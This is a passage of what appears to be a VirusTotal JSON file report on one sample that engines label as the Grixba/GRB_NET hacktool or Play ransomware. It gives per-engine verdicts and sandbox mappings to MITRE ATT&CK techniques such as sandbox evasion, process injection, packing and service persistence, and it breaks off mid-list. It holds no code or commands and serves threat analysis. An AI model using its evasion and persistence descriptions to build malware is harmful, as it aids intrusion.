        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5021",
          "result": "Tool.GRBNET.Win32.1",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Hacktool.Win32.Grbnet.Vi5r",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.132.50545",
          "result": "Hacktool ( 005ab3ac1 )",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Alibaba": {
          "category": "undetected",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.132.50547",
          "result": "Hacktool ( 005ab3ac1 )",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.605",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231222"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Infostealer.Grixba",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28470",
          "result": "a variant of MSIL/HackTool.GRB_NET.A",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.482",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20231225"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:HackTool.MSIL.GRBNET.gen",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win32:HacktoolX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.13cb8388",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Application.HackTool.AZM (B)",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Redcap.rjzcu",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231226"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Ransom_Play.R002C0DEA23",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": "suspicious.low.ml.score",
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Grixba (PUA)",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37050B:27.34348",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W32/ABRisk.SVPC-5597",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Redcap.rjzcu",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=74)",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/Win32.SGeneric",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "MSIL.HackTool.GRBNET.gen",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.152.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36293",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Application.HackTool.AZM",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:HackTool.MSIL.GRBNET.gen",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231227-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Ransom:Win32/Play!MSR",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1703680246",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231121"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Trojan/Win.Ransom.C5564462",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!09F341874F72",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-27.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Malware.AI.3358182462",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Ransom_Play.R002C0DEA23",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Hacktool.GRBNET!8.181A5 (CLOUD)",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Riskware.GRB_NET!7n7qsryJD70",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.201933805.susgen",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/Filecoder.PLAY!tr.ransom",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win32:HacktoolX-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20231224"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "reputation": -2
    },
    "type": "file",
    "id": "453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries the cryptographic machine GUID"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates guard pages, often used to prevent reverse engineering and debugging"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains long sleeps (>= 3 min)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May sleep (evasive loops) to hinder dynamic analysis"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "PE file has an executable .text section which is very likely to contain packed code (zlib compression ratio < 0.3)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "id": "T1027.002",
                "name": "Software Packing"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "Yomi Hunter": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "start service"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "modify service"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM). Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.  ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "access WMI data in .NET"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1047/",
                "id": "T1047",
                "name": "Windows Management Instrumentation"
              },
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to dynamically load a malicious function"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to load dynamically one or more functions."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
